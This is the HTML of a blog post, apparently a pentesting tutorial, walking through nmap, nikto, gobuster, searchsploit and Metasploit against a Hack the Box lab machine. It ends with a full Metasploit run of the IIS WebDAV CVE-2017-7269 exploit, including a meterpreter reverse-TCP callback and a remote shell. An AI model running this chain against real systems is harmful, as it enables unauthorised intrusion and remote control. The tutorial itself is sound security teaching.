@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="We, web engineers, love to use steady and up-to-date web servers, well-known authentication frameworks, and robust encryption libraries. We also issue Let&amp;rsquo;s encrypt certificates in order to encrypt our traffic, and leverage cloud private networks with well-thought-out security policies. Not even mention the salted hashes for storing passwords, and a lot more besides, and many many more security measures. We think our applications are rock solid, as secure as they can be." />
+<meta name="keywords" content=", pentesting, web, hacking" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://notsag-dev.github.io/posts/hacking-tools-for-web-engineers/" />
+
+
+    <title>
+        
+            Hacking tools for web engineers :: @notsag-dev 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d1ea4af8fd04fb24a4f8b882ea54bd04eb245427ca4baf527c81a5dab071410b.css">
+
+
+
+
+
+
+<meta itemprop="name" content="Hacking tools for web engineers">
+<meta itemprop="description" content="We, web engineers, love to use steady and up-to-date web servers, well-known authentication frameworks, and robust encryption libraries. We also issue Let&rsquo;s encrypt certificates in order to encrypt our traffic, and leverage cloud private networks with well-thought-out security policies. Not even mention the salted hashes for storing passwords, and a lot more besides, and many many more security measures. We think our applications are rock solid, as secure as they can be.">
+<meta itemprop="datePublished" content="2020-09-21T04:02:47-03:00" />
+<meta itemprop="dateModified" content="2020-09-21T04:02:47-03:00" />
+<meta itemprop="wordCount" content="2933">
+<meta itemprop="image" content="https://notsag-dev.github.io/"/>
+
+
+
+<meta itemprop="keywords" content="pentesting,web,hacking," />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://notsag-dev.github.io/"/>
+
+<meta name="twitter:title" content="Hacking tools for web engineers"/>
+<meta name="twitter:description" content="We, web engineers, love to use steady and up-to-date web servers, well-known authentication frameworks, and robust encryption libraries. We also issue Let&rsquo;s encrypt certificates in order to encrypt our traffic, and leverage cloud private networks with well-thought-out security policies. Not even mention the salted hashes for storing passwords, and a lot more besides, and many many more security measures. We think our applications are rock solid, as secure as they can be."/>
+
+
+
+    <meta property="og:title" content="Hacking tools for web engineers" />
+<meta property="og:description" content="We, web engineers, love to use steady and up-to-date web servers, well-known authentication frameworks, and robust encryption libraries. We also issue Let&rsquo;s encrypt certificates in order to encrypt our traffic, and leverage cloud private networks with well-thought-out security policies. Not even mention the salted hashes for storing passwords, and a lot more besides, and many many more security measures. We think our applications are rock solid, as secure as they can be." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://notsag-dev.github.io/posts/hacking-tools-for-web-engineers/" />
+<meta property="og:image" content="https://notsag-dev.github.io/"/>
+<meta property="article:published_time" content="2020-09-21T04:02:47-03:00" />
+<meta property="article:modified_time" content="2020-09-21T04:02:47-03:00" /><meta property="og:site_name" content="@notsag-dev" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-09-21 04:02:47 -0300 -03" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">cd /home/notsag-dev</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://notsag-dev.github.io/posts">Blog</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        14 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://notsag-dev.github.io/posts/hacking-tools-for-web-engineers/">Hacking tools for web engineers</a>
+      </h1>
+
+      
+
+      <div class="post-content">
+        <p>We, web engineers, love to use steady and up-to-date web servers, well-known authentication frameworks, and robust encryption libraries. We also issue <a href="https://letsencrypt.org/">Let&rsquo;s encrypt</a> certificates in order to encrypt our traffic, and leverage cloud private networks with well-thought-out security policies. Not even mention the salted hashes for storing passwords, and a lot more besides, and many many more security measures. We think our applications are rock solid, as secure as they can be. But, are they?</p>
+<p>In this post I&rsquo;m going to be walking you through five tools you can easily set up and run in order to test the security of your servers and web applications. Note that the examples listed below are executed against a vulnerable-on-purpose <a href="https://www.hackthebox.eu/">Hack the Box</a> machine referenced by its IP address, but the URL of your site may be used instead.</p>
+<p><strong>Warning:</strong> Some of the listed examples are very intrusive. Be sure to execute them against a local instance of the application or a test environment.</p>
+<h2 id="nmap">Nmap</h2>
+<p><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a></p>
+<p>I discovered this great tool around 12 years ago. I remember it was mind-blowing to me that Ubuntu came with it installed out-of-the-box given the nature of the app! At that point it was the most popular network mapping tool around, and it still holds that position today. It has many capabilities such as host discovery, port scanning, service and OS detection, vulnerability analysis, and much more!</p>
+<p>It is very common to run an nmap scan (or several ones) when approaching a system to get information about the services running on it. Then, depending on the results of the scan, other more specific scans and searches may be executed.</p>
+<p>Example:</p>
+<pre><code>$ nmap -A 10.10.10.14
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-15 00:06 EDT
+Nmap scan report for 10.10.10.14 (10.10.10.14)
+Host is up (0.16s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+| http-methods: 
+|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
+|_http-server-header: Microsoft-IIS/6.0
+|_http-title: Under Construction
+| http-webdav-scan: 
+|   Server Date: Tue, 15 Sep 2020 04:13:15 GMT
+|   WebDAV type: Unknown
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|_  Server Type: Microsoft-IIS/6.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.79 seconds
+</code></pre><p>The <code>-A</code> flag means the scan is aggressive which includes OS detection, service versions detection, and the execution of the default set of scripts. For less intrusive attacks use <code>--script=safe</code> instead. For vulnerability detection (very useful, but more intrusive) use <code>--script=vuln</code>.</p>
+<p>The results show a Windows machine running the Microsoft IIS 6.0 web server on port 80. The next steps will be oriented to collect information about the web server and try to exploit it in order to get access to the system.</p>
+<p>Tip: If nmap indicates the host is down, it may be because the server it is not configured to reply to ping requests. Adding <code>-Pn</code> will launch the scan and ignore the ping check.</p>
+<h2 id="nikto">Nikto</h2>
+<p><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a></p>
+<p>Nikto is a fantastic web scanner that examins web servers to find software misconfigurations, default/insecure paths available, and vulnerability to attacks such as cross-site scripting and clickjacking, among many others. The solution for some of the vulnerabilities detected by Nikto is as simple as adding a new header to your http responses which may be a neat quick win for your team.</p>
+<p>Example:</p>
+<pre><code>$ nikto -host 10.10.10.14
+
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.14
++ Target Hostname:    10.10.10.14
++ Target Port:        80
++ Start Time:         2020-09-14 20:55:10 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Microsoft-IIS/6.0
++ Retrieved microsoftofficewebserver header: 5.0_Pub
++ Retrieved x-powered-by header: ASP.NET
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Retrieved x-aspnet-version header: 1.1.4322
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Retrieved dasl header: &lt;DAV:sql&gt;
++ Retrieved dav header: 1, 2
++ Retrieved ms-author-via header: MS-FP/4.0,DAV
++ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
++ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
++ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
++ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
++ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
++ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
++ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
++ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
++ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
++ WebDAV enabled (SEARCH LOCK PROPFIND MKCOL PROPPATCH UNLOCK COPY listed as allowed)
++ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://10.10.10.14/
++ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
++ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
++ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
++ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
++ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
++ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
++ 8015 requests: 0 error(s) and 27 item(s) reported on remote host
++ End Time:           2020-09-14 21:18:51 (GMT-4) (1421 seconds)
+</code></pre><p>With a pretty simple command execution a lot of information about the web server was retrieved. On the top, information about the web server technologies and the development tools. Then, headers information including missing headers that would allow some kinds of attacks. And finally, warnings about available HTTP methods and interesting files and directories. Note also the OSVDB references, these are known vulnerabilities that are part of a database and their ids may help find further information about them (including exploits).</p>
+<h2 id="gobuster">Gobuster</h2>
+<p><a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></p>
+<p>Gobuster is a widely-used tool to bruteforce web server paths. It is useful for detecting interesting files and folders that may lead to information disclosure or, even worse, remote code execution. In the example below the <code>common.txt</code> list of paths is used, which can be found as part of the <a href="https://github.com/danielmiessler/SecLists">SecLists repository</a>.</p>
+<p>Example:</p>
+<pre><code>$ gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt --url 10.10.10.14
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.14
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/09/15 00:33:16 Starting gobuster
+===============================================================
+/Images (Status: 301)
+/_private (Status: 403)
+/_vti_bin (Status: 301)
+/_vti_bin/_vti_adm/admin.dll (Status: 200)
+/_vti_bin/shtml.dll (Status: 200)
+/_vti_cnf (Status: 403)
+/_vti_log (Status: 403)
+/_vti_pvt (Status: 403)
+/_vti_txt (Status: 403)
+/_vti_bin/_vti_aut/author.dll (Status: 200)
+/aspnet_client (Status: 403)
+/images (Status: 301)
+===============================================================
+2020/09/15 00:34:40 Finished
+===============================================================
+</code></pre><p>The result shows which paths were found and their corresponding HTTP status codes. Note that this information complements the already quick path discovery performed by Nikto, getting some new paths this time.</p>
+<p>So, should these paths be visible or not? First of all navigate them, see what information can be obtained from them. Then, for standard paths it will be enough some Googling (or Duckduckgoing) in order to determine if they should be publicly available or not, do your investigation depending on your scan results!</p>
+<h2 id="searchsploit">Searchsploit</h2>
+<p><a href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a></p>
+<p>Searchsploit is a great tool for finding available exploits for applications and kernels. If a vulnerable version of an application is being executed on your server, it may be possible for a malicious actor to exploit it to gain access to your data or perform other types of attacks. On the other hand, being able to execute these verifications ourselves is a great skill to have to proactively defend our systems.</p>
+<p>It is worth mentioning that searchsploit works pretty well with Nmap, Nikto and other scanners, as after discovering what services are running on a certain server they can be searched by version number on searchsploit to see if there are any exploits available.</p>
+<p>Example:</p>
+<pre><code>$ searchsploit iis 6.0
+
+------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                             |  Path
+------------------------------------------------------------------------------------------- ---------------------------------
+Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure           | windows/remote/21057.txt
+Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                    | windows/remote/9541.pl
+Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                      | windows/dos/9587.txt
+Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                               | windows/dos/3965.pl
+Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)     | windows/dos/15167.txt
+Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                   | windows/remote/41738.py
+Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                | windows/remote/8704.txt
+Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                | windows/remote/8806.pl
+Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                            | windows/remote/8754.patch
+Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (PHP)                              | windows/remote/8765.php
+Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                   | windows/remote/19033.txt
+------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre><p>This is the result of searching exploits for the IIS 6.0 web server that was detected before using both Nmap and Nikto. It can be appreciated that several exploits were found for this particular version of IIS, having on the left column a short description of the vulnerability, and on the right colum the path of exploits and other files with relevant information.</p>
+<p>Tip: To retrieve the exact location of the exploits or info files on your system, let&rsquo;s say for the first one listed which is <code>windows/remote/21057.txt</code>,  run <code>searchsploit -p windows/remote/21057.txt</code>. If <code>locate</code> is available, <code>locate windows/remote/21057.txt</code> would also work.</p>
+<p><strong>Warning:</strong> Do not just execute exploits if you are not sure about what they do, some of them are harmful. Open the exploit file and see what it does before running it.</p>
+<h2 id="metasploit">Metasploit</h2>
+<p><a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a></p>
+<p>Metasploit is an exploitation framework created by Rapid7. It is widely used by security professionals and also by black-hat hackers, and it simplifies A LOT the process of collecting information, doing a vulnerability analysis, exploiting, and post-exploiting a system. When it comes to learning resources about this tool, I cannot recommend highly enough <a href="https://www.youtube.com/watch?v=TCPyoWHy4eA&amp;list=PL7-g2-mnZwSEFhqybJFEPZYhNFqqbCe9_">Hak5&rsquo;s Metasploit Minute</a> and <a href="https://www.youtube.com/watch?v=8lR27r8Y_ik&amp;list=PLBf0hzazHTGN31ZPTzBbk70bohTYT7HSm">HackerSploit&rsquo;s Metasploit videos</a>!</p>
+<p>This example will be a little bit different to the other ones as we will use <em>msfconsole</em>, the Metasploit console, to gain access to the server and pop and actual shell on it. This can be done in less than two minutes by following a few simple steps:</p>
+<ol>
+<li>Search for IIS-related Metasploit modules (similar to searchsploit)</li>
+<li>Select an exploit and set its options</li>
+<li>Run exploit and gain access to the system</li>
+</ol>
+<h3 id="search-for-iis-related-metasploit-modules">Search for IIS-related Metasploit modules</h3>
+<p>Let&rsquo;s use the <code>search</code> command to search for modules that contain the keyword <em>iis</em>:</p>
+<pre><code>msf5 &gt; search iis
+
+Matching Modules
+================
+
+   #   Name                                                             Disclosure Date  Rank       Check  Description
+   -   ----                                                             ---------------  ----       -----  -----------
+   0   auxiliary/admin/appletv/appletv_display_video                                     normal     No     Apple TV Video Remote Control
+   1   auxiliary/admin/http/iis_auth_bypass                             2010-07-02       normal     No     MS10-065 Microsoft IIS 5 NTFS Stream Authentication Bypass
+   2   auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof                     2010-12-21       normal     No     Microsoft IIS FTP Server Encoded Response Overflow Trigger
+   3   auxiliary/dos/windows/ftp/iis_list_exhaustion                    2009-09-03       normal     No     Microsoft IIS FTP Server LIST Stack Exhaustion
+   4   auxiliary/dos/windows/http/ms10_065_ii6_asp_dos                  2010-09-14       normal     No     Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service
+   5   auxiliary/scanner/http/dir_webdav_unicode_bypass                                  normal     No     MS09-020 IIS6 WebDAV Unicode Auth Bypass Directory Scanner
+   6   auxiliary/scanner/http/iis_internal_ip                                            normal     No     Microsoft IIS HTTP Internal IP Disclosure
+   7   auxiliary/scanner/http/iis_shortname_scanner                                      normal     Yes    Microsoft IIS shortname vulnerability scanner
+   8   auxiliary/scanner/http/ms09_020_webdav_unicode_bypass                             normal     No     MS09-020 IIS6 WebDAV Unicode Authentication Bypass
+   9   auxiliary/scanner/http/owa_iis_internal_ip                       2012-12-17       normal     No     Outlook Web App (OWA) / Client Access Server (CAS) IIS HTTP Internal IP Disclosure
+   10  exploit/windows/firewall/blackice_pam_icq                        2004-03-18       great      No     ISS PAM.dll ICQ Parser Buffer Overflow
+   11  exploit/windows/ftp/ms09_053_ftpd_nlst                           2009-08-31       great      No     MS09-053 Microsoft IIS FTP Server NLST Response Overflow
+   12  exploit/windows/http/amlibweb_webquerydll_app                    2010-08-03       normal     Yes    Amlibweb NetOpacs webquery.dll Stack Buffer Overflow
+   13  exploit/windows/http/ektron_xslt_exec_ws                         2015-02-05       excellent  Yes    Ektron 8.5, 8.7, 9.0 XSLT Transform Remote Code Execution
+   14  exploit/windows/http/umbraco_upload_aspx                         2012-06-28       excellent  No     Umbraco CMS Remote Command Execution
+   15  exploit/windows/iis/iis_webdav_scstoragepathfromurl              2017-03-26       manual     Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow
+   16  exploit/windows/iis/iis_webdav_upload_asp                        2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution
+   17  exploit/windows/iis/ms01_023_printer                             2001-05-01       good       Yes    MS01-023 Microsoft IIS 5.0 Printer Host Header Overflow
+   18  exploit/windows/iis/ms01_026_dbldecode                           2001-05-15       excellent  Yes    MS01-026 Microsoft IIS/PWS CGI Filename Double Decode Command Execution
+   19  exploit/windows/iis/ms01_033_idq                                 2001-06-18       good       No     MS01-033 Microsoft IIS 5.0 IDQ Path Overflow
+   20  exploit/windows/iis/ms02_018_htr                                 2002-04-10       good       No     MS02-018 Microsoft IIS 4.0 .HTR Path Overflow
+   21  exploit/windows/iis/ms02_065_msadc                               2002-11-20       normal     Yes    MS02-065 Microsoft IIS MDAC msadcs.dll RDS DataStub Content-Type Overflow
+   22  exploit/windows/iis/ms03_007_ntdll_webdav                        2003-05-30       great      Yes    MS03-007 Microsoft IIS 5.0 WebDAV ntdll.dll Path Overflow
+   23  exploit/windows/iis/msadc                                        1998-07-17       excellent  Yes    MS99-025 Microsoft IIS MDAC msadcs.dll RDS Arbitrary Remote Command Execution
+   24  exploit/windows/isapi/ms00_094_pbserver                          2000-12-04       good       Yes    MS00-094 Microsoft IIS Phone Book Service Overflow
+   25  exploit/windows/isapi/ms03_022_nsiislog_post                     2003-06-25       good       Yes    MS03-022 Microsoft IIS ISAPI nsiislog.dll ISAPI POST Overflow
+   26  exploit/windows/isapi/ms03_051_fp30reg_chunked                   2003-11-11       good       Yes    MS03-051 Microsoft IIS ISAPI FrontPage fp30reg.dll Chunked Overflow
+   27  exploit/windows/isapi/rsa_webagent_redirect                      2005-10-21       good       Yes    Microsoft IIS ISAPI RSA WebAgent Redirect Overflow
+   28  exploit/windows/isapi/w3who_query                                2004-12-06       good       Yes    Microsoft IIS ISAPI w3who.dll Query String Overflow
+   29  exploit/windows/scada/advantech_webaccess_dashboard_file_upload  2016-02-05       excellent  Yes    Advantech WebAccess Dashboard Viewer uploadImageCommon Arbitrary File Upload
+   30  exploit/windows/ssl/ms04_011_pct                                 2004-04-13       average    No     MS04-011 Microsoft Private Communications Transport Overflow
+</code></pre><p>It is possible to recognize several exploits and scanners among the Metasploit modules available for IIS servers, please take a moment to read through the results. This time the <em>Microsoft IIS WebDav ScStoragePathFromUrl Overflow</em> exploit will be used (search result number 15 on the list), which is related to the <a href="https://www.cvedetails.com/cve/CVE-2017-7269/">CVE-2017-7269</a> vulnerability and it is also know as &ldquo;Exploding Can&rdquo;. Note that, when successful, the execution of this exploit leads to remote code execution.</p>
+<h3 id="select-an-exploit-and-set-its-options">Select an exploit and set its options</h3>
+<p>The <code>use</code> command will be used to select the exploit to be executed, and <code>show options</code> to get the options that have to be set in order to execute it:</p>
+<pre><code>msf5 &gt; use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; show options
+
+Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   MAXPATHLENGTH  60               yes       End of physical path brute force
+   MINPATHLENGTH  3                yes       Start of physical path brute force
+   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT          80               yes       The target port (TCP)
+   SSL            false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI      /                yes       Path of IIS 6 web application
+   VHOST                           no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.14.8       yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Microsoft Windows Server 2003 R2 SP2 x86
+</code></pre><p>The only mandatory option that hasn&rsquo;t been set is <strong>RHOSTS</strong>, and corresponds to the target host (victim). So let&rsquo;s set it to the IP address of the same machine we scanned with the previous tools:</p>
+<pre><code>msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; set RHOSTS 10.10.10.14
+RHOSTS =&gt; 10.10.10.14
+</code></pre><h3 id="run-the-exploit-and-gain-access-to-the-system">Run the exploit and gain access to the system</h3>
+<p>A really interesting feature of Metasploit modules is that some of them have a <code>check</code> function to verify if the target host is vulnerable:</p>
+<pre><code>msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; check
+[+] 10.10.10.14:80 - The target is vulnerable.
+</code></pre><p>As the host seems to be vulnerable to this exploit, let&rsquo;s proceed to run it in order to gain access to the server:</p>
+<pre><code>msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) &gt; exploit
+
+[*] Started reverse TCP handler on 10.10.14.8:4444 
+[*] Trying path length 3 to 60 ...
+[*] Sending stage (176195 bytes) to 10.10.10.14
+[*] Meterpreter session 1 opened (10.10.14.8:4444 -&gt; 10.10.10.14:1030) at 2020-09-20 12:49:01 -0400
+</code></pre><p>Boom, we pwned the system! Get some info from it using <code>sysinfo</code> and then open a regular shell:</p>
+<pre><code>meterpreter &gt; sysinfo
+Computer        : GRANPA
+OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
+Architecture    : x86
+System Language : en_US
+Domain          : HTB
+Logged On Users : 2
+Meterpreter     : x86/windows
+
+meterpreter &gt; shell
+
+[-] Failed to spawn shell with thread impersonation. Retrying without it.
+Process 2900 created.
+Channel 10 created.
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+c:\windows\system32\inetsrv&gt;
+</code></pre><p>And that&rsquo;s it! We got a meterpreter session that remotely controls the victim machine, and we also were able to pop a regular shell on it. A next step would be to gain root access to this computer, but I will leave that one for the next time :)</p>
+<h2 id="summary">Summary</h2>
+<p>On this post we went through a pretty standard security assessment that any web engineer would be able to run. What we did:</p>
+<ol>
+<li>Run an <strong>nmap</strong> scan to discover services running on a server.</li>
+<li>Run a <strong>nikto</strong> scan to evaluate the security of the web server running on port 80 detected by nmap.</li>
+<li>Run a <strong>gobuster</strong> scan in order to list interesting files and folders of the web server.</li>
+<li>Use <strong>searchsploit</strong> to determine if there are any existing exploits for the technologies listed by nmap, nikto and gobuster.</li>
+<li>Use the <strong>metasploit framework</strong> to search for exploits and to gain access to the system.</li>
+</ol>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://notsag-dev.github.io/tags/pentesting/">pentesting</a></span>
+        <span class="tag"><a href="https://notsag-dev.github.io/tags/web/">web</a></span>
+        <span class="tag"><a href="https://notsag-dev.github.io/tags/hacking/">hacking</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        2933 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2020-09-21 04:02
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fnotsag-dev.github.io%2fposts%2fhacking-tools-for-web-engineers%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fnotsag-dev.github.io%2fposts%2fhacking-tools-for-web-engineers%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
